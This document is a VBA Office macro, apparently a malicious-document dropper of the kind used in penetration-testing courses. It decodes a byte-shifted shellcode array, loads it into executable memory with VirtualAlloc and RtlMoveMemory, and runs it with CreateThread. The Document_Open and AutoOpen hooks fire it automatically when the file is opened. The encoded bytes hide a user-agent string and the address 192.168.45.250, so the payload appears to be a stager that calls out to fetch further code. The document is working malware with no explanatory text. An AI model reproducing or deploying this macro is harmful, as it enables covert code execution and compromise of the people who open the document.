Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Sub MyMacro()
Dim buf As Variant
Dim addr As LongPtr
Dim counter As Long
Dim data As Long
Dim res As Long
buf = Array(254, 234, 145, 2, 2, 2, 98, 51, 212, 102, 141, 84, 50, 139, 231, 141, 84, 14, 141, 84, 22, 17, 185, 76, 40, 141, 116, 42, 51, 1, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 141, 84, _
18, 141, 68, 62, 89, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 141, 74, 26, 82, 141, 90, 34, 3, 213, 135, 203, 118, 62, 51, 1, 75, 141, 54, 141, 3, 216, 51, 194, 174, 195, 209, 15, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 131, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 107, 82, 99, 102, 61, 34, 69, _
82, 87, 34, 81, 85, 34, 51, 57, 97, 50, 97, 52, 34, 110, 107, 109, 103, 34, 79, 99, 101, 34, 81, 85, 34, 90, 43, 34, 67, 114, 114, 110, 103, 89, 103, 100, 77, 107, 118, 49, 56, 50, 55, 48, 51, 48, 51, 55, 34, 42, _
77, 74, 86, 79, 78, 46, 34, 110, 107, 109, 103, 34, 73, 103, 101, 109, 113, 43, 34, 88, 103, 116, 117, 107, 113, 112, 49, 51, 56, 48, 55, 34, 79, 113, 100, 107, 110, 103, 49, 51, 55, 71, 51, 54, 58, 34, 85, 99, 104, 99, _
116, 107, 49, 56, 50, 54, 48, 51, 2, 106, 60, 88, 123, 169, 1, 215, 85, 85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 220, 2, 2, 2, 49, 71, 103, 114, 90, 79, 116, 106, 76, 119, 82, 97, 57, 57, 104, 116, 117, 112, _
109, 82, 67, 54, 83, 87, 51, 69, 100, 91, 108, 97, 120, 69, 52, 88, 59, 91, 79, 70, 85, 74, 106, 117, 91, 50, 51, 71, 73, 91, 56, 87, 59, 69, 72, 50, 71, 89, 92, 113, 92, 116, 108, 114, 54, 113, 54, 101, 111, 123, _
68, 121, 114, 114, 53, 117, 2, 82, 106, 89, 139, 161, 200, 1, 215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, _
108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, 88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 77, 2, 2, 2, 108, 66, 106, 2, _
18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, 1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, _
97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 55, 48, 52, 55, 50, 2, 189, 242, 183, 164, 88, 108, 2, 85, 1, 215)
For i = 0 To UBound(buf)
buf(i) = buf(i) - 2
Next i
addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
For counter = LBound(buf) To UBound(buf)
data = buf(counter)
res = RtlMoveMemory(addr + counter, data, 1)
Next counter
res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
MyMacro
End Sub
Sub AutoOpen()
MyMacro
End Sub